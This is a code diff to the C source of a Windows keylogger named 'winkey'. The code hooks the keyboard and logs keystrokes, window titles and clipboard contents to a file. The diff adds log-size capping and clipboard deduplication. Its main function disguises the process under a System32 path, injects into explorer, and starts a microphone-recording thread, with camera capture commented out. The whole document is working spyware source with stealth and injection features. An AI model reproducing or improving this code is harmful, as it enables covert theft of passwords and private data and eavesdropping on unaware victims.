@@ -1,16 +1,17 @@
-#include "../winkey.h"
+#include "winkey.h"
 
 HHOOK g_ouk;
+static char last_clip[1024] = {0};
 
 #ifdef _M_X64
 PPEB GetPEB(void)
 {
-    return (PPEB)__readgsqword(0x60);
+	return (PPEB)__readgsqword(0x60);
 }
 #else
 PPEB GetPEB(void)
 {
-    return (PPEB)__readfsdword(0x30);
+	return (PPEB)__readfsdword(0x30);
 }
 #endif
 
@@ -19,6 +20,7 @@ volatile int g_camera_run = 0;
 
 DWORD WINAPI thread_micro(LPVOID lp)
 {
+	(void)lp;
 	while(1)
 	{
 		if (g_micro_run)
@@ -115,6 +117,17 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 		get_window_title(title);
 		int new_key = vk_to_char(kbd->vkCode, key);
 		char *spe_touch = special_touch(kbd->vkCode);
+		DWORD size = 0;
+		WIN32_FILE_ATTRIBUTE_DATA fad;
+		if (GetFileAttributesExA("winkey.log", GetFileExInfoStandard, &fad))
+		{
+			size = fad.nFileSizeLow;
+		}
+		if (size > 5 * 1024 * 1024)
+		{
+			FILE *reset = fopen("winkey.log", "w");
+			fclose(reset);
+		}
 		FILE *f = fopen("winkey.log", "a");
 		if (f)
 		{
@@ -125,8 +138,11 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 				fprintf(f, "%s\n", key);
 			else
 				fprintf(f, "VK(%lu)\n", kbd->vkCode);
-			if (clip[0] != '\0')
+			if (clip[0] != '\0' && strcmp(clip, last_clip) != 0)
+			{
 				fprintf(f,"[CLIPBOARD] %s\n", clip);
+				strcpy_s(last_clip, sizeof(last_clip), clip);
+			}
 			fclose(f);
 		}
 	}
@@ -154,12 +170,16 @@ int run_winkey(void)
 	return 0;
 }
 
+
+
 int main(void)
 {
-	hide_process(L"C:\\Windows\\System32\\host.exe");
-	HANDLE h = CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
-	start_camera();
-	if (inject_into_explorer())
-		return 0;
+	hide_process(L"C:\\Windows\\System32\\winkey.exe");
+	CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
+	//start_camera();
+	
+	inject_into_explorer();
 	return (run_winkey());
 }
+
+
